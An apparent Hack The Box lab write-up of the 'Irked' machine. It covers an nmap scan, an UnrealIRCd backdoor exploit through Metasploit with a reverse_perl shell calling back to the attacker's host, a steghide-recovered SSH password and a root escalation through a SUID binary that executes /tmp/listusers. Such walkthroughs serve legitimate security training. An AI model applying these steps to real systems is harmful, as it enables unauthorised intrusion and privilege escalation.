# IRKED

## ENUMERATION

We start with nmap scan 

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34193/tcp   status
|   100024  1          39410/udp   status
|   100024  1          43898/tcp6  status
|_  100024  1          48990/udp6  status
6697/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
8067/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
34193/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
we find 7 open ports 

On visiting the http website 

![](https://github.com/Leo-2807/Writeups/blob/main/images/irked.png)

I tried gobuster but there was nothing useful

On searching how to hack UnrealIRCd I came across this [article](https://www.hackingtutorials.org/metasploit-tutorials/hacking-unreal-ircd-3-2-8-1/)

# SHELL

Following the article I gained a metasploit reverse shell

```
┌──(kali㉿kali)-[~/Downloads/hackthebox]
└─$ msfconsole                        
                                                  
 _                                                    _
/ \    /\         __                         _   __  /_/ __                                    
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \                                   
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|                                  
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_                                  
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\                                 
                                                                                               

       =[ metasploit v6.0.45-dev                          ]
+ -- --=[ 2134 exploits - 1139 auxiliary - 364 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Tired of setting RHOSTS for modules? Try 
globally setting it with setg RHOSTS x.x.x.x

msf6 > serach unrealircd
[-] Unknown command: serach.
msf6 > search unrealircd

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor                                                                          

msf6 > use 0
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   payload/cmd/unix/bind_perl                                   normal  No     Unix Command Shell, Bind TCP (via Perl)
   1   payload/cmd/unix/bind_perl_ipv6                              normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2   payload/cmd/unix/bind_ruby                                   normal  No     Unix Command Shell, Bind TCP (via Ruby)
   3   payload/cmd/unix/bind_ruby_ipv6                              normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   4   payload/cmd/unix/generic                                     normal  No     Unix Command, Generic Command Execution
   5   payload/cmd/unix/reverse                                     normal  No     Unix Command Shell, Double Reverse TCP (telnet)
   6   payload/cmd/unix/reverse_bash_telnet_ssl                     normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
   7   payload/cmd/unix/reverse_perl                                normal  No     Unix Command Shell, Reverse TCP (via Perl)
   8   payload/cmd/unix/reverse_perl_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
   9   payload/cmd/unix/reverse_ruby                                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   10  payload/cmd/unix/reverse_ruby_ssl                            normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
   11  payload/cmd/unix/reverse_ssl_double_telnet                   normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 7
payload => cmd/unix/reverse_perl
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts fil
                                      e with syntax 'file:<path>'
   RPORT   6667             yes       The target port (TCP)


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOST 10.10.10.117
RHOST => 10.10.10.117
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 10.10.14.41
LHOST => 10.10.14.41
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set port 6697
port => 6697
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
```
Use ```shell``` command to spin a proper shell

```
ircd@irked:~/Unreal3.2$ whoami
whoami
ircd
```

# SSH

Now that I have a shell I looked into the home directory and found a user ```djmardov``` 
Looking into djmardov home directory I tried to read the user.txt but we do not have permission for that 
But while looking at the permissions we do have permission to read the ```.backup``` file

```
ircd@irked:/home/djmardov$ cd Documents
cd Documents
ircd@irked:/home/djmardov/Documents$ ls -la
ls -la
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
ircd@irked:/home/djmardov/Documents$ cat .backup
cat .backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
We find this steg password and there was only one image we saw till now 

After downloading the image of the big emoji we saw on the http page I ran steghide with this passphrase and we retrived a file

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/irked]
└─$ steghide --extract -sf index.jpeg                                                
Enter passphrase: 
wrote extracted data to "pass.txt"
```
Reading the pass.txt file

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/irked]
└─$ cat pass.txt
Kab6h+m+bbp2J:HG
```

Now i tried to ssh with creds ```username : djmardov and password : Kab6h+m+bbp2J:HG```

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/irked]
└─$ ssh djmardov@10.10.10.117         
The authenticity of host '10.10.10.117 (10.10.10.117)' can't be established.
ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.117' (ECDSA) to the list of known hosts.
djmardov@10.10.10.117's password: 
Permission denied, please try again.
djmardov@10.10.10.117's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ whoami
djmardov
```

# USER --> ROOT

I ran linEnum.sh another privelge escalation script
And I did find something interesting 

```
[-] SUID files:
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
```
Taking a look at the viewuser file

```
djmardov@irked:/usr/bin$ ./viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-08-10 11:35 (:0)
djmardov pts/1        2021-08-10 12:38 (10.10.14.41)
sh: 1: /tmp/listusers: not found
```

So this binary reads the file ```/tmp/listusers``` 
I made the file 

```
djmardov@irked:/usr/bin$ cd /tmp
djmardov@irked:/tmp$ ls
systemd-private-f08c34f22c5a4d1c9fc7989ba93e2c0a-colord.service-6QDW05
systemd-private-f08c34f22c5a4d1c9fc7989ba93e2c0a-cups.service-Upwgze
systemd-private-f08c34f22c5a4d1c9fc7989ba93e2c0a-rtkit-daemon.service-cwnPZb
vmware-root
djmardov@irked:/tmp$ nano listusers
djmardov@irked:/tmp$ cd /usr/bin
djmardov@irked:/usr/bin$ ./viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-08-10 11:35 (:0)
djmardov pts/1        2021-08-10 12:38 (10.10.14.41)
sh: 1: /tmp/listusers: Permission denied
```

I gave it the permission

```
djmardov@irked:/usr/bin$ chmod +x /tmp/listusers
djmardov@irked:/usr/bin$ viewusers
bash: viewusers: command not found
```

Seems like it is running commands so we can run a command to give us root shell

```
djmardov@irked:/usr/bin$ echo sh > /tmp/listusers
djmardov@irked:/usr/bin$ viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-08-10 11:35 (:0)
djmardov pts/1        2021-08-10 12:38 (10.10.14.41)
# whoami
root
```

